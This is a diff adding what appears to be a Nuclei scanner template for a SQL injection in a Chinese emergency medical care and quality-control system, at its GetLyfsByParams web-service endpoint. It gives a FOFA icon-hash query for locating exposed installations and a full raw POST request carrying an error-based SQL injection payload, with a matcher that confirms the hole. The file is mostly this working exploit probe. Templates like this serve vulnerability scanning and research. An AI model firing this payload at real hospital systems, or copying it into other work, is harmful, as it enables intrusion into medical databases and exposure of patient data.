@@ -1,0 +1,32 @@
+id: BQFJZNJJ-GetLyfsByParams-sql
+
+info:
+  name: 扁鹊飞救智能急救与质控系统 GetLyfsByParams SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: icon_hash="-757866684" || icon_hash="-1206146847"
+  reference:
+    - 
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/2.0
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br, zstd
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Upgrade-Insecure-Requests: 1
+
+        strOpid=1 AND (SELECT 9054 FROM(SELECT COUNT(*),CONCAT(0x717a767671,(SELECT (ELT(9054=9054,1))),0x717a707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&strTempID=1&strNumber=&strUnit=
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code == 500 && contains (body,'qzvvq1qzpzq1')"
